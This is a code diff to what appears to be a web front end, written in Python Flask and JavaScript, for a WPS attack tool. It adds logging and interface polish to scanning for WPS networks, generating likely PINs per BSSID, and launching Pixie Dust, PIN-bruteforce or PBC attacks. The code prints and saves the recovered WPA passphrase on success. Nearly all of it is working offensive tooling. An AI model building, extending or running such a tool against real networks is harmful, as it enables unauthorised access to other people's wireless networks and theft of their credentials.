@@ -181,7 +181,12 @@ def get_own_ip():
 def ifaceUp(iface, down=False):
     action = 'down' if down else 'up'
     cmd = 'ip link set {} {}'.format(iface, action)
+    print(f"[*] Running: {cmd}")
     res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    if res.returncode == 0:
+        print(f"[+] Interface {iface} is {action}")
+    else:
+        print(f"[-] Failed to bring {iface} {action} (exit code {res.returncode})")
     return res.returncode == 0
 
 # ============================================================
@@ -192,6 +197,8 @@ def do_scan_in_thread(iface, vuln_path='', reverse=False):
     oneshot.args.reverse_scan = reverse
     try:
         with LogCapture():
+            print(f"[*] Starting scan on {iface}...")
+            print(f"[*] Command: iw dev {iface} scan")
             if not ifaceUp(iface):
                 print(f"[-] Failed to bring up {iface}")
                 return
@@ -199,11 +206,24 @@ def do_scan_in_thread(iface, vuln_path='', reverse=False):
             try:
                 with open(path, 'r', encoding='utf-8') as f:
                     current_vuln_list = f.read().splitlines()
+                print(f"[*] Loaded {len(current_vuln_list)} vulnerable devices from {os.path.basename(path)}")
             except:
                 current_vuln_list = []
+                print("[*] No vuln list loaded")
+            print("[*] Scanning for WPS networks...")
             scanner = WiFiScanner(iface, current_vuln_list)
             result = scanner.iw_scanner()
             scan_results = list(result.values()) if result else []
+            print(f"[+] Scan complete: {len(scan_results)} network(s) found")
+            for n in scan_results[:5]:
+                essid = n.get('ESSID', '<hidden>')
+                bssid = n.get('BSSID', '')
+                ch = n.get('Channel', '')
+                sig = n.get('Level', '')
+                wps = n.get('WPS', '')
+                print(f"    {bssid}  {essid}  CH{ch}  {sig}dBm  WPS:{wps}")
+            if len(scan_results) > 5:
+                print(f"    ... and {len(scan_results)-5} more")
     except Exception as e:
         print(f"[-] Scan error: {e}")
     finally:
@@ -232,12 +252,29 @@ def do_attack_in_thread(params):
 
     try:
         with LogCapture():
+            print(f"[*] ===== Attack Configuration =====")
+            print(f"[*] Interface : {iface}")
+            print(f"[*] BSSID     : {bssid}")
+            print(f"[*] PIN       : {pin if pin else '(auto)'}")
+            print(f"[*] Delay     : {delay}s")
+            print(f"[*] Mode      : {'PBC' if pbc else 'Bruteforce' if bruteforce else 'Pixie' if pixie else 'PIN'}")
+            print(f"[*] Loop      : {'Yes' if loop else 'No'}")
+            print(f"[*] Verbose   : {'Yes' if verbose else 'No'}")
+            print(f"[*] Write     : {'Yes' if write else 'No'}")
+            print(f"[*] Iface Down: {'Yes' if iface_down else 'No'}")
+            print(f"[*] PixieForce: {'Yes' if pixie_force else 'No'}")
+            print(f"[*] Show Cmd  : {'Yes' if show_cmd else 'No'}")
+            print(f"[*] MTK WiFi  : {'Yes' if mtk else 'No'}")
+            print(f"[*] =================================")
+
             if mtk:
                 from pathlib import Path
                 wmt = Path('/dev/wmtWifi')
                 if wmt.is_char_device():
+                    print("[*] Enabling MediaTek WiFi interface...")
                     wmt.chmod(0o644)
                     wmt.write_text('1')
+                    print("[+] /dev/wmtWifi enabled")
                 else:
                     print("[-] /dev/wmtWifi not found")
                     return
@@ -253,6 +290,7 @@ def do_attack_in_thread(params):
                         print("[!] Attack stopped by user")
                         break
 
+                    print(f"[*] Creating Companion for {iface}...")
                     oneshot.args.loop = loop
                     companion = Companion(iface, write, print_debug=verbose)
                     current_companion = companion
@@ -260,18 +298,27 @@ def do_attack_in_thread(params):
                     atk_pin = pin
                     if pbc:
                         atk_pin = '<PBC>'
+                        print(f"[*] Starting PBC connection...")
                         companion.single_connection(pbc_mode=True)
                     elif bruteforce:
                         atk_pin = atk_pin if atk_pin else '0000'
+                        print(f"[*] Starting bruteforce from PIN {atk_pin}...")
                         companion.smart_bruteforce(bssid, atk_pin, delay)
                     else:
                         if pixie and not atk_pin:
                             atk_pin = WPSpin().getLikely(bssid) or '12345670'
+                            print(f"[*] Generated PIN: {atk_pin}")
+                        print(f"[*] Starting {'Pixie Dust' if pixie else 'PIN'} attack with PIN {atk_pin}...")
                         companion.single_connection(bssid, atk_pin, pixie, False,
                                                     show_cmd, pixie_force)
 
                     if companion.connection_status.status == 'GOT_PSK':
                         cs = companion.connection_status
+                        print(f"[+] SUCCESS! Credentials obtained:")
+                        print(f"    ESSID : {cs.essid or bssid}")
+                        print(f"    BSSID : {cs.bssid or bssid}")
+                        print(f"    PIN   : {atk_pin}")
+                        print(f"    PSK   : {cs.wpa_psk}")
                         save_history(
                             essid=cs.essid or bssid,
                             bssid=cs.bssid or bssid,
@@ -281,7 +328,10 @@ def do_attack_in_thread(params):
                         )
 
                     if not loop:
+                        print("[*] Attack complete (single mode)")
                         break
+                    else:
+                        print("[*] Loop iteration complete, continuing...")
                 except KeyboardInterrupt:
                     if loop:
                         print("[?] Continuing loop...")
@@ -292,6 +342,7 @@ def do_attack_in_thread(params):
                     if companion is not None:
                         try:
                             companion.cleanup()
+                            print("[*] Companion cleaned up")
                         except:
                             pass
                     current_companion = None
@@ -325,8 +376,10 @@ def api_scan():
     iface = request.args.get('interface', 'wlan0')
     vuln_path = request.args.get('vuln_list', '')
     reverse = request.args.get('reverse', 'false').lower() == 'true'
+    log_queue.put(f'[*] Scan requested on {iface}')
     operation_thread = threading.Thread(target=do_scan_in_thread, args=(iface, vuln_path, reverse), daemon=True)
     operation_thread.start()
+    log_queue.put(f'[+] Scan thread started')
     return jsonify({'status': 'ok'})
 
 @app.route('/api/networks')
@@ -351,27 +404,47 @@ def api_networks():
 def api_generate_pin():
     bssid = request.args.get('bssid', '')
     bssid = bssid.replace('-', ':').upper()
+    log_queue.put(f'[*] Generating PIN for BSSID: {bssid}')
     try:
         pin = WPSpin().getLikely(bssid)
+        if pin:
+            log_queue.put(f'[+] Generated PIN: {pin}')
+        else:
+            log_queue.put(f'[-] No PIN could be generated for {bssid}')
         return jsonify({'pin': pin if pin else 'No PIN generated'})
     except Exception as e:
+        log_queue.put(f'[-] PIN generation error: {e}')
         return jsonify({'error': str(e)}), 400
 
 @app.route('/api/attack', methods=['POST'])
 def api_attack():
     global operation_thread, attack_running
     if attack_running:
+        log_queue.put('[-] Attack already running, request denied')
         return jsonify({'error': 'Attack already running'}), 400
     params = request.get_json()
+    bssid = params.get('bssid', '')
+    mode = 'PBC' if params.get('pbc') else 'Bruteforce' if params.get('bruteforce') else ('Pixie' if params.get('pixie') else 'PIN')
+    log_queue.put(f'[*] Attack requested: {mode} mode on {bssid}')
     operation_thread = threading.Thread(target=do_attack_in_thread, args=(params,), daemon=True)
     operation_thread.start()
+    log_queue.put(f'[+] Attack thread started')
     return jsonify({'status': 'ok'})
 
 @app.route('/api/stop')
 def api_stop():
     global current_companion, attack_running
+    log_queue.put('[!] Stop requested by user')
     stop_event.set()
     attack_running = False
+    if current_companion:
+        log_queue.put('[!] Cleaning up companion...')
+        try:
+            current_companion.cleanup()
+        except:
+            pass
+        current_companion = None
+    log_queue.put('[!] Attack stopped')
     return jsonify({'status': 'ok'})
 
 @app.route('/api/status')
@@ -551,6 +624,15 @@ label { font-size: 13px; color: var(--text-dim); }
   display: flex; gap: 8px; justify-content: flex-end;
   padding: 12px 16px; border-top: 1px solid var(--border);
 }
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner {
+  display: inline-block; width: 12px; height: 12px; border: 2px solid var(--text-dim);
+  border-top-color: var(--accent); border-radius: 50%; animation: spin .6s linear infinite;
+  vertical-align: middle; margin-right: 4px;
+}
+.status-running { color: var(--green); }
+.status-waiting { color: var(--orange); }
+.status-error { color: var(--red); }
 @media (max-width: 600px) {
   .col { min-width: 100%; }
   .header { flex-direction: column; align-items: stretch; }
@@ -584,7 +666,7 @@ label { font-size: 13px; color: var(--text-dim); }
         <div class="card-title">PIN</div>
         <div class="pin-row">
           <input id="pin" placeholder="Enter PIN or leave empty" spellcheck="false">
-          <button class="btn" onclick="generatePin()">Generate</button>
+          <button class="btn" id="genPinBtn" onclick="generatePin()">Generate</button>
         </div>
       </div>
     </div>
@@ -665,12 +747,17 @@ function escapeHtml(s) {
   return d.innerHTML;
 }
 
+let ifaceCount = 0;
 function refreshIfaces() {
   fetch('/api/interfaces').then(r=>r.json()).then(data => {
     const sel = document.getElementById('iface');
     const current = sel.value;
     sel.innerHTML = data.map(i => `<option value="${i}">${i}</option>`).join('');
     if (data.includes(current)) sel.value = current;
+    if (data.length !== ifaceCount) {
+      ifaceCount = data.length;
+      log(`[*] Interfaces: ${data.length} found (${data.join(', ') || 'none'})`);
+    }
   });
 }
 
@@ -678,8 +765,10 @@ function startScan() {
   const iface = document.getElementById('iface').value;
   const vuln = document.getElementById('vuln_list').value;
   const rev = document.getElementById('opt_reverse').checked;
-  document.getElementById('netList').innerHTML = '<div style="padding:8px;color:var(--orange);font-size:13px">Scanning...</div>';
+  document.getElementById('netList').innerHTML = '<div style="padding:8px;color:var(--orange);font-size:13px"><span class="spinner"></span> Scanning...</div>';
   document.getElementById('scanBtn').disabled = true;
+  document.getElementById('statusBadge').textContent = 'Scanning...';
+  log(`[*] Scan started — interface: ${iface}, reverse: ${rev}, vuln list: ${vuln || '(default)'}`);
   fetch(`/api/scan?interface=${encodeURIComponent(iface)}&vuln_list=${encodeURIComponent(vuln)}&reverse=${rev}`);
 }
 
@@ -708,10 +797,20 @@ function selectNet(i, bssid) {
 
 function generatePin() {
   const bssid = document.getElementById('bssid').value;
-  if (!bssid) { log('Enter BSSID first', 'warn'); return; }
+  if (!bssid) { log('[-] Enter BSSID first', 'warn'); return; }
+  log(`[*] Generating PIN for ${bssid}...`);
+  document.getElementById('genPinBtn').disabled = true;
   fetch(`/api/generate_pin?bssid=${encodeURIComponent(bssid)}`).then(r=>r.json()).then(data => {
-    if (data.pin) { document.getElementById('pin').value = data.pin; log(`Generated PIN: ${data.pin}`); }
-    else if (data.error) log(`PIN error: ${data.error}`, 'err');
+    document.getElementById('genPinBtn').disabled = false;
+    if (data.pin && data.pin !== 'No PIN generated') {
+      document.getElementById('pin').value = data.pin;
+      log(`[+] PIN generated: ${data.pin}`);
+    } else {
+      log(`[-] No PIN available for ${bssid}`, 'warn');
+    }
+  }).catch(() => {
+    document.getElementById('genPinBtn').disabled = false;
+    log('[-] PIN generation failed', 'err');
   });
 }
 
@@ -740,15 +839,19 @@ function getParams() {
 function startAttack() {
   if (attackRunning) return;
   const params = getParams();
-  if (!params.iface) { log('Select interface', 'warn'); return; }
+  if (!params.iface) { log('[-] Select interface', 'warn'); return; }
+  if (!params.bssid && !params.pbc) { log('[-] Select a network or enable PBC mode', 'warn'); return; }
+  const modeName = params.pbc ? 'PBC' : params.bruteforce ? 'Bruteforce' : params.pixie ? 'Pixie Dust' : 'Standard PIN';
+  log(`[*] Attack requested — mode: ${modeName}, iface: ${params.iface}, bssid: ${params.bssid || '(PBC)'}, pin: ${params.pin || 'auto'}`);
+  log(`     delay=${params.delay}s loop=${params.loop} verbose=${params.verbose} write=${params.write} force=${params.force} iface_down=${params.iface_down} mtk=${params.mtk}`);
   fetch('/api/attack', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(params)})
   .then(r=>r.json()).then(d => {
-    if (d.error) { log(d.error, 'err'); return; }
+    if (d.error) { log(`[-] ${d.error}`, 'err'); return; }
     attackRunning = true;
     document.getElementById('startBtn').disabled = true;
     document.getElementById('stopBtn').disabled = false;
     document.getElementById('statusBadge').textContent = 'Attack running...';
-    log('[*] Attack started', 'info');
+    log('[+] Attack started', 'info');
   });
 }
 
